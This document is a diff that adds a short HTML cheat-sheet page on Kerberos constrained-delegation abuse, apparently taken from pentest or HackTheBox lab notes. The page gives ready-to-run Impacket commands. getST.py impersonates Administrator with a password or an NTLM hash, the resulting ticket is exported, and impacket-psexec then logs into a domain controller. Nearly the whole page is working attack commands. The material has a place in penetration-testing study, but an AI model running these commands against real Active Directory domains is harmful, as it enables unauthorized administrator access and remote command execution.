@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>get silver ticket</title>
+</head><body>https://wadcoms.github.io/wadcoms/Impacket-getST-Creds/<br/>
+<br/>
+<span style="font-family: sans"><div style="text-align: justify">If the account has constrained delegation privileges, you can use the </div></span>-impersonate<span style="font-family: sans"><div style="text-align: justify"> flag to request a ticket on behalf of another user.</div></span>&nbsp; <br/>
+<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123<br/>
+<br/>
+<b><br/>
+with hash<br/>
+</b>python3 getST.py -spn www/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes &lt;ntlm hash&gt;:&lt;ntlm hash&gt;<br/>
+<br/>
+<br/>
+&gt;&gt; ticket saving to <b>Administrator.ccache<br/>
+</b><b><br/>
+</b>export KRB5CCNAME=Administrator.ccache<br/>
+<br/>
+<br/>
+login with ticket<br/>
+impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb<br/>
+<br/>
+<img src="image 2.png" /></body></html>
